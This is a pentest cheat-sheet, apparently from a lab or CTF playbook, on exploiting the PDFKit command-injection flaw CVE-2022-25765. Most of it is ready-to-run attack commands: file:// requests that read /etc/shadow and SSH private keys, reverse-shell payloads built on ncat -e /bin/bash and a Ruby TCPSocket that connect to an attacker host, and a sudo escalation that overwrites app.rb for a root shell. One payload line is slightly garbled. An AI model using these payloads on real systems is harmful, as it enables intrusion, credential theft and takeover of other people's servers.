title: PDFKit — CVE-2022-25765 Command Injection + SSRF File Read
body:
PDFKit is a Ruby gem that wraps wkhtmltopdf to convert HTML/URLs to PDF. CVE-2022-25765 affects PDFKit < 0.8.7.2 — the URL parameter passed to wkhtmltopdf is not sanitised, allowing command injection via URL-encoded newlines or backticks. The patch in 0.8.7 was incomplete; 0.8.7.2 is the real fix.

Fingerprint: WEBrick on an unusual port (3000, 8080), app title 'HTML to PDF', error message 'PDFKit::ImproperWkhtmltopdfExitStatus' when you send a bad URL. That error is a free CVE handoff — it names the gem.

Two attack surfaces: (1) command injection via the URL parameter (RCE as the web app user), and (2) SSRF via file:// protocol to read arbitrary files on the server (useful when the app user has access to sensitive files or the sudoers file).
cmd:
# ══════════════════════════════════════════════════
# 1 — FINGERPRINT
# ══════════════════════════════════════════════════
# nmap shows: WEBrick httpd 1.7.0 (Ruby 3.x.x)
# Browser title: 'HTML to PDF' or similar
# Trigger the error — send a bad URL:
curl -s -X POST http://<IP>:<PORT>/pdf -d 'url=ssdnf' | head -30
# Look for: PDFKit::ImproperWkhtmltopdfExitStatus
# and the wkhtmltopdf command in the backtrace — confirms the gem + version.

# Check the gem version from the error backtrace or:
curl -s http://<IP>:<PORT>/ | grep -i 'pdfkit\|wkhtmltopdf\|version'

# ══════════════════════════════════════════════════
# 2 — SSRF: file:// local file read (no CVE needed)
# ══════════════════════════════════════════════════
# wkhtmltopdf follows file:// URLs by default — no injection required.
# Works on ALL versions, not just vulnerable ones.
curl -s -X POST http://<IP>:<PORT>/pdf -d 'url=file:///etc/passwd' -o out.pdf
pdftotext out.pdf -          # extract text from the PDF

# High-value targets:
curl -s -X POST http://<IP>:<PORT>/pdf -d 'url=file:///root/.ssh/id_rsa' -o id_rsa.pdf
curl -s -X POST http://<IP>:<PORT>/pdf -d 'url=file:///etc/shadow' -o shadow.pdf
curl -s -X POST http://<IP>:<PORT>/pdf -d 'url=file:///home/<USER>/.ssh/id_rsa' -o id_rsa.pdf
curl -s -X POST http://<IP>:<PORT>/pdf -d 'url=file:///etc/sudoers' -o sudoers.pdf
# Read the PDF and extract the content to Kali:
pdftotext out.pdf -

# ══════════════════════════════════════════════════
# 3 — CVE-2022-25765: command injection (< 0.8.7.2)
# ══════════════════════════════════════════════════
# The URL is passed to wkhtmltopdf unsanitised.
# Injection via URL-encoded space+backtick: %20`<cmd>`
# The command runs in a subshell as the app user.

# Method A — curl direct injection (listener on LPORT):
curl -s -X POST http://<IP>:<PORT>/pdf \
  --data-urlencode 'url=http://anything%20`ncat -e /bin/bash <LHOST> <LPORT>`'

# Method B — the PoC from shamo0/PDFkit-CMD-Injection:
# Payload embeds in the URL field:
# url=http://%20`ruby -rsocket -e'spawn("sh",[[:in,:out,:err]]=>
TCPSocket.new("<LHOST>",<LPORT>))'`
curl -X POST http://<IP>:<PORT>/pdf \
  --data-urlencode $'url=http://\x20`ruby -rsocket -e\'spawn("sh",[[: in,:out,:err]]=>TCPSocket.new("<LHOST>",<LPORT>))\'`'

# Simplest working payload (nc with -e):
curl -X POST http://<IP>:<PORT>/pdf \
  -d 'url=http://%20`ncat+-e+/bin/bash+<LHOST>+<LPORT>`'

# ══════════════════════════════════════════════════
# 4 — VERIFY / catch the shell
# ══════════════════════════════════════════════════
# Listener up BEFORE sending the payload:
nc -lvnp <LPORT>
# Shell arrives as the app user (often same as file owner of app.rb)
# Upgrade immediately: python3 -c 'import pty; pty.spawn("/bin/bash")'

# ══════════════════════════════════════════════════
# 5 — POST-SHELL: check sudo (common path to root)
# ══════════════════════════════════════════════════
sudo -l
# Common finding: (ALL) NOPASSWD: /usr/bin/ruby /home/<user>/app/app.rb
# If app.rb is WRITABLE by you:
echo 'exec "/bin/bash"' > /home/<user>/app/app.rb
sudo /usr/bin/ruby /home/<user>/app/app.rb
# = instant root shell (see sudo_check node for full argument-locked detail)
warn: The file:// SSRF works on ALL PDFKit versions — it's a wkhtmltopdf default, not a CVE. The command injection (CVE-2022-25765) requires < 0.8.7.2; the 0.8.7 patch was incomplete so 0.8.7.0 and 0.8.7.1 are still vulnerable. If the app has client-side URL validation, trigger an error first (send a bad URL like 'ssdnf') — the error bypasses the JS validation and confirms the backend gem. The app.rb overwrite is only available when you own the file — check ls -la before assuming you can write it.

choices.label: Got a shell — upgrade + check sudo
File read — found creds in config/sudoers
